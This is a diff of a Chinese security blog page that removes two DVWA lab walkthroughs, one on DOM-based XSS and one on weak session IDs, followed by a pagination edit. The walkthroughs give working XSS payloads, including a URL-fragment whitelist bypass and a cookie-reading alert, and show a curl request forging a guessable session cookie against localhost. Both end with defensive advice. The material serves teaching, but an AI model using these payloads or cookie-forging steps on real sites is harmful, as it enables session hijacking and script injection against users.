-<li>攻击者搞个带恶意代码的 URL</li>
-<li>用户点进去，请求发到服务器</li>
-<li>服务器返回正常页面（恶意代码不在里面）</li>
-<li>浏览器执行 JS，从 URL 里读出恶意代码</li>
-<li>恶意代码被写进 DOM 执行</li>
-</ol>
-<p>服务器日志里看请求，发现不了 XSS 攻击痕迹。</p>
-<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>Low 级别没服务端代码，纯前端 JavaScript：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;default&#x27;</span>) !== -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> lang = <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">split</span>(<span class="string">&#x27;default=&#x27;</span>)[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + lang + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>URL 参数 <code>default</code> 直接写进 DOM，一点过滤都没有。</p>
-<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>测试 XSS：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>![图片占位]</p>
-<p>弹窗了，注入成功。</p>
-<p>偷 Cookie：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>![图片占位]</p>
-<p>也可以用 img 标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 在服务端过滤了 <code>&lt;script</code>：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span> ) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>( <span class="string">&quot;location: ?default=English&quot;</span> );</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>但 DOM 型 XSS 又不是只有 <code>&lt;script&gt;</code> 这一种姿势。</p>
-<h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>用 img 标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>![图片占位]</p>
-<p>用 svg 标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>闭合 select 标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>![图片占位]</p>
-<p>过滤 <code>&lt;script</code> 过滤了个寂寞。</p>
-<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 级别用白名单验证：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ] ) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="string">&quot;location: ?default=English&quot;</span> );</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>只允许四个值，服务端过滤得挺死。但别忘了 URL 锚点。</p>
-<h3 id="攻击方法-2"><a href="#攻击方法-2" class="headerlink" title="攻击方法"></a>攻击方法</h3><p><code>#</code> 后面的东西不会发到服务器，但 JavaScript 能读到：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>![图片占位]</p>
-<p>服务端只看到 <code>default=English</code>，白名单过了。但前端 JS 读的是整个 URL，后面的恶意代码照样执行。</p>
-<p>也可以用 input 标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English#&lt;input onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别没特殊代码，但服务端白名单 + 前端转义：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) + <span class="number">8</span>);</span><br><span class="line">lang = lang.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>把 <code>&lt;</code> 和 <code>&gt;</code> 转义成 <code>&amp;lt;</code> 和 <code>&amp;gt;</code>，恶意代码就不会被当成 HTML 执行了。</p>
-<h2 id="DOM-型-XSS-常见位置"><a href="#DOM-型-XSS-常见位置" class="headerlink" title="DOM 型 XSS 常见位置"></a>DOM 型 XSS 常见位置</h2><table>
-<thead>
-<tr>
-<th>位置</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>document.location</code></td>
-<td>URL 参数</td>
-</tr>
-<tr>
-<td><code>document.URL</code></td>
-<td>完整 URL</td>
-</tr>
-<tr>
-<td><code>document.referrer</code></td>
-<td>来源页面</td>
-</tr>
-<tr>
-<td><code>document.cookie</code></td>
-<td>Cookie</td>
-</tr>
-<tr>
-<td><code>window.name</code></td>
-<td>窗口名称</td>
-</tr>
-<tr>
-<td><code>innerHTML</code></td>
-<td>HTML 内容</td>
-</tr>
-<tr>
-<td><code>document.write()</code></td>
-<td>直接写入 DOM</td>
-</tr>
-<tr>
-<td><code>eval()</code></td>
-<td>执行代码</td>
-</tr>
-</tbody></table>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>DOM 型 XSS 防护要点：</p>
-<ol>
-<li>前端对动态内容要做 HTML 实体编码</li>
-<li>能不用 <code>innerHTML</code>、<code>document.write()</code>、<code>eval()</code> 就别用</li>
-<li>用 <code>textContent</code> 代替 <code>innerHTML</code></li>
-<li>配好 CSP</li>
-<li>URL 参数别直接塞进 DOM</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/16/DVWA-Weak-Session-IDs%E5%BC%B1%E4%BC%9A%E8%AF%9DID%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/16/DVWA-Weak-Session-IDs%E5%BC%B1%E4%BC%9A%E8%AF%9DID%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA Weak Session IDs 弱会话ID通关教程</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-02-16 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-16T10:00:00+08:00">2021-02-16</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Session ID 是服务器识别用户身份的凭证，一般存在 Cookie 里。如果这个 ID 太简单、能猜出来，那攻击者就能冒充别的用户，这就是会话劫持。</p>
-<p>这关主要学怎么分析和利用弱会话 ID。</p>
-<h2 id="Session-基础知识"><a href="#Session-基础知识" class="headerlink" title="Session 基础知识"></a>Session 基础知识</h2><p>先搞清楚几个概念：</p>
-<table>
-<thead>
-<tr>
-<th>概念</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Session</td>
-<td>服务器端存用户会话数据</td>
-</tr>
-<tr>
-<td>Session ID</td>
-<td>标识会话的唯一字符串</td>
-</tr>
-<tr>
-<td>Cookie</td>
-<td>浏览器存的小数据</td>
-</tr>
-<tr>
-<td>Session Cookie</td>
-<td>Cookie 里存的 Session ID</td>
-</tr>
-</tbody></table>
-<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>看代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$session_id</span> = <span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>( <span class="string">&#x27;dvwaSession&#x27;</span>, <span class="variable">$session_id</span> );</span><br></pre></td></tr></table></figure>
-
-<p>好家伙，Session ID 直接用自增数字，从 1 开始。</p>
-<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>打开开发者工具看 Cookie：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dvwaSession=1</span><br><span class="line">dvwaSession=2</span><br><span class="line">dvwaSession=3</span><br></pre></td></tr></table></figure>
-
-<p>每次点一下就 +1，这也太好猜了。</p>
-<p>攻击者随便枚举就能猜到别人的 Session ID：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Cookie: dvwaSession=1&quot;</span> http://localhost:8080/...</span><br></pre></td></tr></table></figure>
-
-<p>这安全性跟没有一样。</p>
-<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 用时间戳当 Session ID：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$session_id</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>( <span class="string">&#x27;dvwaSession&#x27;</span>, <span class="variable">$session_id</span> );</span><br></pre></td></tr></table></figure>
-
-<h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>看 Cookie：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvwaSession=1711683600</span><br><span class="line">dvwaSession=1711683605</span><br></pre></td></tr></table></figure>
-
-<p>看着挺长，其实就是 Unix 时间戳：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">timestamp = <span class="number">1711683600</span></span><br><span class="line"><span class="built_in">print</span>(datetime.datetime.fromtimestamp(timestamp))</span><br><span class="line"><span class="comment"># 2024-03-29 10:00:00</span></span><br></pre></td></tr></table></figure>
-
-<p>知道大概什么时候生成的，就能推算出 Session ID 范围，然后枚举。虽然比自增数字难搞一点，但还是能预测。</p>
-<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 用 <code>mt_rand()</code> 生成随机数：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$session_id</span> = <span class="title function_ invoke__">mt_rand</span>( <span class="number">0</span>, <span class="number">9999999999</span> );</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>( <span class="string">&#x27;dvwaSession&#x27;</span>, <span class="variable">$session_id</span> );</span><br></pre></td></tr></table></figure>
-
-<p>范围是 0 到 9999999999，看着挺大，但 <code>mt_rand()</code> 是伪随机，知道种子就能推算出序列。</p>
-<h3 id="攻击方法-2"><a href="#攻击方法-2" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>收集一批 Session ID：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dvwaSession=1234567890</span><br><span class="line">dvwaSession=9876543210</span><br><span class="line">dvwaSession=5555555555</span><br></pre></td></tr></table></figure>
-
-<p>用统计工具分析规律，或者直接暴力枚举常见值。虽然没那么容易，但理论上还是能搞。</p>
-<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别用加密安全的随机数：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$session_id</span> = <span class="title function_ invoke__">sha1</span>( <span class="title function_ invoke__">uniqid</span>( <span class="title function_ invoke__">mt_rand</span>( <span class="number">0</span>, <span class="number">9999999999</span> ), <span class="literal">true</span> ) );</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>( <span class="string">&#x27;dvwaSession&#x27;</span>, <span class="variable">$session_id</span>, <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">true</span>, <span class="literal">true</span> );</span><br></pre></td></tr></table></figure>
-
-<p>特点：</p>
-<ol>
-<li><code>uniqid()</code> 加随机数生成唯一 ID</li>
-<li><code>sha1()</code> 哈希增加熵</li>
-<li>设置了 <code>HttpOnly</code> 和 <code>Secure</code> 属性</li>
-</ol>
-<p>这才是正确做法。</p>
-<h2 id="安全的-Session-ID-特征"><a href="#安全的-Session-ID-特征" class="headerlink" title="安全的 Session ID 特征"></a>安全的 Session ID 特征</h2><table>
-<thead>
-<tr>
-<th>特征</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>足够长</td>
-<td>至少 128 位</td>
-</tr>
-<tr>
-<td>随机</td>
-<td>用加密安全随机数生成器</td>
-</tr>
-<tr>
-<td>不可预测</td>
-<td>猜不出来下一个</td>
-</tr>
-<tr>
-<td>唯一</td>
-<td>不同会话不同 ID</td>
-</tr>
-<tr>
-<td>有有效期</td>
-<td>过期就失效</td>
-</tr>
-</tbody></table>
-<h2 id="Cookie-安全属性"><a href="#Cookie-安全属性" class="headerlink" title="Cookie 安全属性"></a>Cookie 安全属性</h2><table>
-<thead>
-<tr>
-<th>属性</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>HttpOnly</code></td>
-<td>JS 读不到，防 XSS 偷 Cookie</td>
-</tr>
-<tr>
-<td><code>Secure</code></td>
-<td>只走 HTTPS</td>
-</tr>
-<tr>
-<td><code>SameSite</code></td>
-<td>限制跨站带 Cookie</td>
-</tr>
-<tr>
-<td><code>Path</code></td>
-<td>限制作用路径</td>
-</tr>
-<tr>
-<td><code>Domain</code></td>
-<td>限制作用域名</td>
-</tr>
-</tbody></table>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Session ID 安全要点：</p>
-<ol>
-<li>用加密安全的随机数生成器，别用自增和时间戳</li>
-<li>ID 要够长，128 位起步</li>
-<li>Cookie 设置 HttpOnly 和 Secure</li>
-<li>重要操作后重新生成 Session ID</li>
-<li>设置合理的过期时间</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/7/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/7/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
